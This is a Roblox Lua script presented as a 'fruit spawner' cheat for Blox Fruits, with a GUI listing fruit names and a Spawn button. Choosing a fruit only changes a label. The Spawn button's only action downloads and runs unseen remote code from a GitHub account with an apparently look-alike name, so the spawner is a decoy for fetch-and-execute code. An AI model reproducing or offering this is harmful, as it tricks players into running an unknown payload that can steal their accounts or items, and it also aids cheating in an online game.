-- Create the first Screen GUI
local ScreenGui = Instance.new("ScreenGui")
local Frame1 = Instance.new("Frame")
local ContinueButton = Instance.new("TextButton")

-- Set up the first GUI
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.Name = "FruitSpawner"

Frame1.Parent = ScreenGui
Frame1.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame1.Size = UDim2.new(0, 200, 0, 100)
Frame1.Position = UDim2.new(0.5, -100, 0.5, -50)
Frame1.AnchorPoint = Vector2.new(0.5, 0.5)

ContinueButton.Parent = Frame1
ContinueButton.Size = UDim2.new(0, 180, 0, 50)
ContinueButton.Position = UDim2.new(0.5, -90, 0.5, -25)
ContinueButton.Text = "Continue?"
ContinueButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ContinueButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ContinueButton.Font = Enum.Font.SourceSans
ContinueButton.TextSize = 18

-- Create the second GUI
local Frame2 = Instance.new("Frame")
local Dropdown = Instance.new("TextLabel")
local FruitsList = Instance.new("ScrollingFrame")
local SpawnButton = Instance.new("TextButton")

Frame2.Parent = ScreenGui
Frame2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame2.Size = UDim2.new(0, 300, 0, 200)
Frame2.Position = UDim2.new(0.5, -150, 0.5, -100)
Frame2.AnchorPoint = Vector2.new(0.5, 0.5)
Frame2.Visible = false

Dropdown.Parent = Frame2
Dropdown.Size = UDim2.new(0, 280, 0, 30)
Dropdown.Position = UDim2.new(0.5, -140, 0.1, 0)
Dropdown.Text = "Select a fruit:"
Dropdown.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
Dropdown.Font = Enum.Font.SourceSans
Dropdown.TextSize = 16

FruitsList.Parent = Frame2
FruitsList.Size = UDim2.new(0, 280, 0, 100)
FruitsList.Position = UDim2.new(0.5, -140, 0.3, 0)
FruitsList.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
FruitsList.CanvasSize = UDim2.new(0, 0, 2, 0)

SpawnButton.Parent = Frame2
SpawnButton.Size = UDim2.new(0, 100, 0, 30)
SpawnButton.Position = UDim2.new(0.5, -50, 0.8, 0)
SpawnButton.Text = "Spawn"
SpawnButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
SpawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnButton.Font = Enum.Font.SourceSans
SpawnButton.TextSize = 18

-- List of Blox Fruits
local fruits = {"Bomb", "Spike", "Flame", "Ice", "Dark", "Light", "Rubber", "Barrier", "Magma", "Quake", "Rumble", "Paw", "Gravity", "Dough", "Shadow", "Venom", "Dragon", "Control", "Soul", "Phoenix"}

-- Populate the FruitsList
for i, fruit in ipairs(fruits) do
    local FruitButton = Instance.new("TextButton")
    FruitButton.Parent = FruitsList
    FruitButton.Size = UDim2.new(1, 0, 0, 30)
    FruitButton.Position = UDim2.new(0, 0, 0, (i - 1) * 35)
    FruitButton.Text = fruit
    FruitButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    FruitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    FruitButton.Font = Enum.Font.SourceSans
    FruitButton.TextSize = 14
    FruitButton.MouseButton1Click:Connect(function()
        Dropdown.Text = "Selected: " .. fruit
    end)
end

-- Button Functionality
ContinueButton.MouseButton1Click:Connect(function()
    Frame1.Visible = false
    Frame2.Visible = true
end)

SpawnButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/reaIredz/BloxFruits/refs/heads/main/refs/heads/main/Source.lua"))()
end)
